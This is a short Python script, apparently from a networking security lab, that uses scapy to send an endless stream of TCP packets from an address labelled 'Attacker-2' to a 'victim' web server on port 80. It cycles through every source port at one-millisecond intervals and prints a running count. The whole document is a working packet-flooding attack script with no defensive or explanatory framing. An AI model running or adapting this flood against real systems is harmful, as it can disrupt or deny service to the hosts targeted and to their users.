from scapy.all import *
import time

attack2_ip = "10.9.0.106"
victim_ip = "10.9.0.5"
count = 1

while True:
   for attack2_port in range(1, 65535):
      IP2 = IP(src = attack2_ip, dst = victim_ip)
      TCP2 = TCP(sport = attack2_port, dport = 80)
      packet = IP2 / TCP2
      send(packet, inter = .001)
      
      print ("Packet ", count , " sent from Attacker-2")
      count = count + 1
      #time.sleep(2)
